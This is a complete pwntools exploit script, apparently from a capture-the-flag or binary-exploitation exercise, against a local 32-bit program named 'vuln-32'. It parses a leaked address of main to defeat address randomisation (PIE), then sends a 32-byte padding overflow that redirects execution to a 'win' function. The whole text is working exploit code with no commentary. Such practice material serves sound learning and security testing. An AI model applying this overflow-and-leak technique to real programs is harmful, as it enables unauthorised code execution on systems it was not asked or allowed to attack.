from pwn import *
elf = context.binary = ELF("./vuln-32")
p = process()
offset = 32
p.recvuntil(b"Main Function is at: ")
main_leak = int(p.recvline().strip().decode(),16)
print(main_leak)
print(elf.sym['main'])
elf.address = main_leak - elf.sym['main']
win = p32(elf.sym['win'])
payload = b"A" * offset + win + p32(0x0)
p.sendline(payload)
print(p.recvall().strip().decode())